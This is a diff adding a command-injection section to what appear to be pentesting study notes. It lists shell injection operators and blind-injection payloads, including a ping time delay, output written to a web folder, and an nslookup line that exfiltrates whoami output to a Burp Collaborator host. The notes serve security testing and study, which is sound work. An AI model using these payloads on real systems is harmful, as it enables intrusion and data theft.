@@ -633,5 +633,46 @@ We can upload a regular image and then either intercept or replay the request by
 ]>
 ```
 
+# Command Injection
 
+Command injection is a vulnerability where an attacker is able to execute arbitrary commands on a host operating system by manipulating an application's input. 
+When testing for the Command Injection it is essential to understand the behavior of the application and to try to use different Injection operators such as:
+
+```
+;
+
+\n
+
+&
+
+|
+
+&&
+
+||
+
+``
+
+$()
+```
+Make sure to URL-Encode these special characters if needed in order for command injection to be successful. Also it's important to undrestand the context of command Injection operators in terms that not every command injection operator will allow **behaves differently**. For example if we use ```;``` command injection operator this will execute both commands, but if we use ```&&``` then, both commands will be executed only if the first one succeeds!
+
+## Exploting
+
+**1)** In the first case, the application doesn't have any defense in place in terms of filtering and sanitizing user input, meaning that we have to find out which Command Injection Operator will work in order to achieve Command Execution.
+
+**2)** Sometimes when we identify command injection, the output of our command will not be returned in the response, indicating that we have **Blind Command Injection**. To confirm that we have found **Blind Command Injection** we can cause time delays with payloads such as:
+``` ping -c 10 127.0.0.1``` or we can try to use ```curl``` to our Burp Collaborator, or similar tricks, where we don't need HTTP Response in order to know that we are successful. 
+
+We can exfiltrate the data by using **Blind Command Injection** in multiple ways such as:
+
+**2.1)** If we find **writable** folder we can use that to exfiltrate the information such as:
+
+```& whoami > /var/www/images/info.txt & ``` ---> here we are using 2 times ```&``` Command Injection Operator in order to isolate our command, then we are executing ```whoami``` and storing the output of it inside /var/www/images as we are dealing with Blind Command Injection and we don't get anything in the HTTP Response + we idenfited that /var/www/images is writable folder. Then simply navigate to the htttp://target-app.com/images/info.txt and observe that output of ```whoami``` command is stored in _info.txt file_
+
+**2.2)** Another approach that is very powerful in case we don't have _writable folder_ is **Data Exfiltration with DNS Lookup** so, we can combine **nslookup + Burp Collaborator** in order to exfiltrate the data. With following payload we can exfiltarte the data to our Burp Collaborator:
+
+```& nslookup `whoami`.BURP.oastify.com & ``` ---> here again we are isolating our command with ```&``` Injection Operator and executing ```whoami``` with ``` `` ``` and with help of nslookup we can exfiltarte the result to our Burp Collaborator as a subdomain.
+
+With this command, we will receive a DNS lookup to Burp Collaborator with ```whoami``` command executed as a 'subdomain' of Collaborator's domain!
 
